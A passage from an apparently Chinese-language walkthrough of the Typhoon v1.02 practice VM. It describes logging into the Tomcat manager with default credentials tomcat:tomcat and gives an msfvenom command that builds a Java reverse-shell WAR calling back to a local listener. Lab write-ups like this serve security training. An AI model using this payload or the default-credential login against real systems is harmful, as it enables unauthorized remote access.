# shell as tomcat7 by war-deploy

既然数据库和共享相关服务都不存在有效攻击向量，重点就放在web，发现`8080/tcp`是一个`tomcat default page`

使用`tomcat:tomcat`登录到`manger`，通过`war`包部署`getshell`即可

`msfvenom -p java/shell_reverse_tcp lhost=192.168.1.101 lport=8888 -f war -o pwn.war`

![](assets/images/2025-08-31-typhoon-v1.02-Walkthrough/e77453de-96f2-4e27-bad5-2b237ed654fa.png)

发现`/var/www/html/`下有`/xvwa`目录，访问后发现是个靶场….interesting

![](assets/images/2025-08-31-typhoon-v1.02-Walkthrough/5d05d963-cd2b-4894-90b2-3e1308cf35c0.png)

通过一波侦察，发现获得`inital access`的路径不止一条

# shell as admin by burp

![](assets/images/2025-08-31-typhoon-v1.02-Walkthrough/aa2043f5-ec09-441f-92df-b4551dc1700e.png)
